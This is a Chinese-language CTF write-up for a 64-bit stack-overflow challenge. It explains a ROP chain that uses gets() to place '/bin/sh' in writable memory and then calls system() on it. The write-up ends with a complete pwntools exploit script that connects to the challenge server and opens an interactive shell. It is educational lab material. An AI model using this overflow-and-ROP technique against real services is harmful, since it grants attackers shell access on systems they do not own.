# 挑战简介
64位的 system(); 但是好像没"/bin/sh" 上面的办法不行了，想想办法

# 思路
没有binsh，就创造binsh，system有，get有  
所以构造ROP利用链 **填充 + 第一次调用链: 调用 gets(buf2_addr) + 第二次调用链: 调用 system(buf2_addr)**

## 第一次利用链

p64(rdi_addr) (0x4007f3): 这是第一个被执行的gadget地址。这个地址指向 pop rdi; ret 指令。当被溢出的函数返回时，RIP（指令指针）会指向这里。

pop rdi: 从栈顶弹出一个值（即下面的 buf2_addr）放入 RDI 寄存器。  
ret: 从栈顶弹出下一个地址（即下面的 ret_addr）放入 RIP，程序跳转到那里。

p64(buf2_addr) (0x602080): 这是 pop rdi 指令要弹出的值。buf2_addr 是一个程序数据段（如 .bss 或 .data）中的地址，通常是可读可写的。执行 pop rdi 后，RDI 寄存器的值就变成了 buf2_addr。这是为了给接下来的 gets 函数准备参数。   

p64(ret_addr) (0x4004fe): 这是 pop rdi; ret 中的 ret 指令要跳转到的地址。这个地址通常指向一个简单的 ret 指令。在64位系统中，有时需要它来做栈对齐。某些函数（尤其是libc中的函数，如 system）要求在调用它们时，栈指针 RSP 必须是16字节对齐的。call 指令会隐式地将返回地址（8字节）压栈，可能导致栈不对齐。插入一个 ret gadget可以弹出8字节，有助于恢复对齐。即使不是严格必需，它也不会破坏ROP链。执行这个 ret 后，程序会从栈顶弹出下一个地址（即下面的 get_addr）并跳转。

p64(get_addr) (0x400530): 这是 gets 函数（或者功能类似的函数，如 read）的地址。此时，RDI 寄存器里已经是 buf2_addr。执行这个地址的代码就相当于调用了  gets(buf2_addr)。程序会等待用户输入，并将输入的内容存放到 buf2_addr 指向的内存区域。  

发送 "/bin/sh": 在payload发送后，脚本紧接着 p.sendline("/bin/sh")。这行输入会被上面调用的 gets(buf2_addr) 读取，并存储在 0x602080 这个地址。

## 第二次利用链

当 gets 函数执行完毕返回时，它会从栈上寻找返回地址。此时栈顶就是我们payload中 gets 地址后面的部分。

p64(rdi_addr) (0x4007f3): 又一次指向 pop rdi; ret。

pop rdi: 从栈顶弹出值（下面的 buf2_addr）放入 RDI。  
ret: 跳转到栈顶的下一个地址（下面的 ret_addr）。

p64(buf2_addr) (0x602080): 这是 pop rdi 弹出的值。此时，0x602080 这个地址里存放的是我们刚刚输入的字符串 "/bin/sh"。执行 pop rdi 后，RDI 指向了字符串 "/bin/sh"。这正是调用 system 函数所需要的参数。

p64(ret_addr) (0x4004fe): 同样是为了栈对齐或简单地过渡到下一个地址。执行 ret 后，跳转到栈顶的 system_addr。

p64(system_addr) (0x400520): 这是 system 函数的地址。此时 RDI 已经包含了 "/bin/sh" 字符串的地址。执行这个地址的代码就相当于调用了 system("/bin/sh")。

---
```
#!/usr/bin/python3

from pwn import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28181)

offset = 0xA + 0x8

system_addr = 0x400520

rdi_addr = 0x4007f3

ret_addr = 0x4004fe

buf2_addr = 0x602080

get_addr = 0x400530

payload = b'a' * offset + p64(rdi_addr) + p64(buf2_addr) + p64(ret_addr) + p64(get_addr) + p64(rdi_addr) + p64(buf2_addr) + p64(ret_addr) + p64(system_addr)

print(payload)

p.sendline(payload)

p.sendline("/bin/sh")

p.interactive()
```
